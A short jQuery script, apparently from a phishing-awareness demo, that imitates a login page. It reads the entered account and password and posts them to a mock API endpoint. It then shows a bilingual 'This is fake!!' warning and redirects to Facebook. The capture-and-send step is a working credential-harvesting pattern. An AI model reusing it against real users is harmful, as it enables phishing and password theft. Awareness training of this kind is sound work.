$("#login").click(function(){
    console.log({
        account: $("#acc").val(),
        password: $("#pwd").val()
    })
    $.post("https://jsonplaceholder.typicode.com/posts",
    {
        account: $("#acc").val(),
        password: $("#pwd").val()
    },
    function(data, status){
      console.log("Data: " + data + "\nStatus: " + status);
      Swal.fire({
        title: '這是假的!!\nThis is fake!!!',
        text: '注意網址以及貓咪，他們可能會是假的',
        icon: 'error',
        confirmButtonText: '下次會注意'
      }).then(function(data) {
        location.replace("https://www.facebook.com");
      })
    })
});